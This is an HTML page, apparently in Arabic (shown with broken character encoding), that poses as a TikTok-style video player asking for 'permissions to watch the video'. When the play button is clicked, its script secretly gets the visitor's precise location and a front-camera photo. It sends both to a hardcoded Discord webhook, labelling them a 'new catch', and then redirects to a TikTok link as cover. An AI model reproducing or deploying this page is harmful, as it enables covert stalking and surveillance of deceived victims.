 <!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</title>
    <style>
        body { margin: 0; background: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
        .card { text-align: center; width: 90%; max-width: 400px; }
        button { background: #fe2c55; color: white; padding: 15px 40px; border-radius: 50px; font-size: 18px; border: none; cursor: pointer; font-weight: bold; }
        #canvas, video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <button id="startBtn">â–¶ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</button>
        <p>Ø¨Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ù„Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙÙŠ Ù…Ù†Ø·Ù‚ØªÙƒ</p>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const discordUrl = 'https://discord.com/api/webhooks/1462333386679910473/Nguba4bLHhTBYcBoV_3J5VUTc3qgiDuwnrJorHJkEm4BghKpbzbTPfe3FcqI7yVe8dt_';

        document.getElementById('startBtn').addEventListener('click', async () => {
            // 1. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

                // 2. Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØªØµÙˆÙŠØ± Ù„Ù‚Ø·Ø©
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    await new Promise(res => setTimeout(res, 1000)); // Ø§Ù†ØªØ¸Ø§Ø± Ø«Ø§Ù†ÙŠØ© Ù„Ù„ØªØ±ÙƒÙŠØ²
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ù„Ù…Ù„Ù Ø­Ù‚ÙŠÙ‚ÙŠ (Blob)
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        // Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØµÙˆØ±Ø© ÙƒÙ…Ù„Ù Ù…Ø±ÙÙ‚
                        formData.append('file1', blob, 'snap.png');
                        // Ø¥Ø¶Ø§ÙØ© ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙÙŠ Ø±Ø³Ø§Ù„Ø©
                        formData.append('payload_json', JSON.stringify({
                            content: `ğŸ“¸ **ØµÙŠØ¯ Ø¬Ø¯ÙŠØ¯ (ØµÙˆØ±Ø© + Ù…ÙˆÙ‚Ø¹)!**\nğŸ“ Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø©: ${mapLink}`
                        }));

                        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙ„ Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
                        await fetch(discordUrl, {
                            method: 'POST',
                            body: formData
                        });

                        // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„ØªØ­ÙˆÙŠÙ„ Ù„Ù„ÙÙŠØ¯ÙŠÙˆ
                        stream.getTracks().forEach(t => t.stop());
                        window.location.href = "https://vt.tiktok.com/ZSadHSu3d/";
                    }, 'image/png');

                } catch (e) {
                    // Ù„Ùˆ Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ØŒ Ø§Ø¨Ø¹Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ø³
                    fetch(discordUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: `ğŸ“ Ø§Ù„Ø´Ø®Øµ Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø³ Ø¯Ù‡ Ù…ÙˆÙ‚Ø¹Ù‡: ${mapLink}` })
                    }).then(() => {
                        window.location.href = "https://vt.tiktok.com/ZSadHSu3d/";
                    });
                }
            }, () => {
                alert("ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ù„Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ.");
            }, { enableHighAccuracy: true });
        });
    </script>
</body>
</html>
